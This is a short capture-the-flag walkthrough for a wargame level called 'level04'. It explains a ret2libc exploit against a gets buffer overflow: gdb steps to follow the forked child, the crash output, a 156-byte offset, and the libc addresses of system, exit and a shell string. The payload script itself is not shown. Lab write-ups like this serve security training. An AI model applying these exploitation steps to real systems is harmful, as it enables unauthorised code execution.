# level04 walkthrough

## the binary
``` shell

Give me some shellcode, k

child is exiting...
```

## methodology
- ret2libc attack

The `gets` function is vulnerable to a buffer overflow, which allows us to perform a ret2libc attack. Calculating the offset is tricky because a child process is created in the `main` function, and thereâ€™s no way for a segmentation fault to occur since the parent process is still waiting. However, we can bypass this issue with the following steps:
``` shell
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 5640]
Give me some shellcode, k

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 5640]
0x41326641 in ?? ()
```

Now for the ret2libc:
1. offset = 156 bytes ([Wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/))
2. address of `system` = 0xf7e6aed0
3. address of `exit` = 0xf7e5eb70
4. address of `/bin/bash` = 0xf7f897ec

Our payload is generated using an attached script.
